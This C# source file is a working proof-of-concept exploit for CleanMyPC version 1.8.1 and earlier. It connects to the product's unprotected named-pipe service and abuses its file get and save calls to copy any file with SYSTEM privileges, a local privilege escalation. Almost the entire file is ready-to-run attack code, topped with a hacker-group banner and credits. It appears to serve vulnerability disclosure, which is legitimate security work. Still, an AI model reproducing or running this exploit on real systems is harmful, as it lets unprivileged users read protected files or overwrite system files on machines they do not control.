using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Xml;
using System.Net.Security;

using System.IO;

namespace ClimbMyPC {

	[GeneratedCode("System.ServiceModel", "4.0.0.0"), DebuggerStepThrough]
	public class CmpDataFilesServiceClient : ClientBase<ICmpDataFilesService>, ICmpDataFilesService
	{
		// Token: 0x060006B5 RID: 1717 RVA: 0x000040C4 File Offset: 0x000022C4
		public CmpDataFilesServiceClient()
		{
		}

		// Token: 0x060006B6 RID: 1718 RVA: 0x000040CC File Offset: 0x000022CC
		public CmpDataFilesServiceClient(string endpointConfigurationName) : base(endpointConfigurationName)
		{
		}

		// Token: 0x060006B7 RID: 1719 RVA: 0x000040D5 File Offset: 0x000022D5
		public CmpDataFilesServiceClient(string endpointConfigurationName, string remoteAddress) : base(endpointConfigurationName, remoteAddress)
		{
		}

		// Token: 0x060006B8 RID: 1720 RVA: 0x000040DF File Offset: 0x000022DF
		public CmpDataFilesServiceClient(string endpointConfigurationName, EndpointAddress remoteAddress) : base(endpointConfigurationName, remoteAddress)
		{
		}

		// Token: 0x060006B9 RID: 1721 RVA: 0x000040E9 File Offset: 0x000022E9
		public CmpDataFilesServiceClient(Binding binding, EndpointAddress remoteAddress) : base(binding, remoteAddress)
		{
		}

		// Token: 0x060006BA RID: 1722 RVA: 0x00019730 File Offset: 0x00017930
		public byte[] GetCleanMyPCDataFileContent(string fileName)
		{
			return base.Channel.GetCleanMyPCDataFileContent(fileName);
		}

		// Token: 0x060006BB RID: 1723 RVA: 0x000040F3 File Offset: 0x000022F3
		public void SaveCleanMyPCDataFileContent(string fileName, byte[] content)
		{
			base.Channel.SaveCleanMyPCDataFileContent(fileName, content);
		}
	}

	[ServiceContract(ConfigurationName = "CmpDataFilesServiceReference.ICmpDataFilesService"), GeneratedCode("System.ServiceModel", "4.0.0.0")]
	public interface ICmpDataFilesService
	{
		// Token: 0x060006B3 RID: 1715
		[OperationContract(Action = "http://tempuri.org/ICmpDataFilesService/GetCleanMyPCDataFileContent", ReplyAction = "http://tempuri.org/ICmpDataFilesService/GetCleanMyPCDataFileContentResponse")]
		byte[] GetCleanMyPCDataFileContent(string fileName);

		// Token: 0x060006B4 RID: 1716
		[OperationContract(Action = "http://tempuri.org/ICmpDataFilesService/SaveCleanMyPCDataFileContent", ReplyAction = "http://tempuri.org/ICmpDataFilesService/SaveCleanMyPCDataFileContentResponse")]
		void SaveCleanMyPCDataFileContent(string fileName, byte[] content);
	}

	[GeneratedCode("System.ServiceModel", "4.0.0.0")]
	public interface ICmpDataFilesServiceChannel : IExtensibleObject<IContextChannel>, IClientChannel, IContextChannel, IChannel, ICommunicationObject, IDisposable, ICmpDataFilesService
	{
	}

	class CopyAsSYSTEM {

		public static void Usage() {
			Console.WriteLine("[*] Usage: {0} source destination",Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location));
			Console.WriteLine("[*] This PoC copies a file to another location with SYSTEM privileges.");
		}
		private static bool IsPathValid(string path) {
			try {
				Path.GetFullPath(path);
				return true;
			} catch (Exception) { return false; }
		}
		private static string FixPath(string path,string srcpath) {
			if (Directory.Exists(path)) path += Path.DirectorySeparatorChar + Path.GetFileName(srcpath);
			return path;
		}
		public static void Main(string[] args) {
			Console.WriteLine(@"  ____________   _____  _________ ____  ___ s l ip ____ ________ _______________");
			Console.WriteLine(@"  /          /  /    / <____/    Y    \/  /  RoL  /    Y     \  Y  /____ /     /");
			Console.WriteLine(@" /       ___/__/_   /_______>    '     \  \____  /     '      > ' / >___/  ___/_");
			Console.WriteLine(@"/               /  '   /   /   >  <    / <___. \/   >  <     /   /   /         /");
			Console.WriteLine(@"\______________/______/___/___/___/___/________/___/___/____/___/___/\________/");
			Console.WriteLine("\n[*] ClimbMyPC - CleanMyPC <= v1.8.1 SYSTEM file read/write PoC");
			Console.WriteLine("[*] another --  r i n g  o f  l i g h t n i n g  -- production by slipstream!");
			Console.WriteLine("[*] slipstream's twitter: @TheWack0lian -- say hello to RoL: https://rol.im/chat/ :: irc.rol.im #galaxy");
			Console.WriteLine("[*] thanks to techdirt for your accidental promotion, without it, this PoC probably wouldn't exist!\n");
			if ((args.Length < 2) || (!IsPathValid(args[0])) || (!IsPathValid(args[1]))) {
				Usage();
				return;
			}
			Console.WriteLine("[+] Connecting to CmpDataFilesService...");
			var NamedPipeBinding = new NetNamedPipeBinding(NetNamedPipeSecurityMode.None);
			NamedPipeBinding.Security.Transport.ProtectionLevel = ProtectionLevel.None;
			NamedPipeBinding.ReaderQuotas = XmlDictionaryReaderQuotas.Max;
			NamedPipeBinding.MaxReceivedMessageSize = 524288L;
			NamedPipeBinding.MaxBufferPoolSize = 4194304L;
			NamedPipeBinding.SendTimeout = TimeSpan.FromMinutes(10.0);
			NamedPipeBinding.ReceiveTimeout = TimeSpan.FromMinutes(10.0);
			var client = new CmpDataFilesServiceClient(NamedPipeBinding,new EndpointAddress("net.pipe://MacPaw/CleanMyPC/system/CmpDataFilesService/static/wcfEndPoint"));
			try {
				client.Open();
			} catch (Exception) {
				Console.WriteLine("[-] Could not connect to CmpDataFilesService; perhaps CleanMyPC's service is not running.");
				return;
			}
			Console.WriteLine("[+] Performing the copy...");
			args[0] = Path.GetFullPath(args[0]);
			args[1] = Path.GetFullPath(args[1]);
			try {
				client.SaveCleanMyPCDataFileContent(FixPath(args[1],args[0]),client.GetCleanMyPCDataFileContent(args[0]));
			} catch (Exception) {
				Console.WriteLine("[-] The copy failed for some reason...");
				return;
			}
			Console.WriteLine("[+] All done!");
		}
	}
}